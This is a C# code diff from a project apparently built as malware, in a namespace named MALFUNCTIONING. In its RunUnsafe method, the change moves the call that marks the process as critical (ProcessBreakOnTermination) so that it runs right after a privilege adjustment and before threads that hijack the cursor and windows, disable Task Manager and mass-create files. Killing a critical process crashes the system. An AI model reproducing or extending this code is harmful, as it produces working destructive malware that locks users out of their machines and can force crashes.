@@ -90,13 +90,13 @@ namespace MALFUNCTIONING
         public static void RunUnsafe()
         {
             RtlAdjustPrivilege(19, true, false, out var previousValue);
+            int val = 1;
+            var ProcessBreakOnTermination = 0x1D;
+            NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, ref val, sizeof(uint));
             NewThread(MoveCursor);
             NewThread(SetForegroundWindows);
             NewThread(DisableTask);
             NewThread(MakeFiles);
-            int val = 1;
-            var ProcessBreakOnTermination = 0x1D;
-            NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, ref val, sizeof(uint));
         }
     }
 }
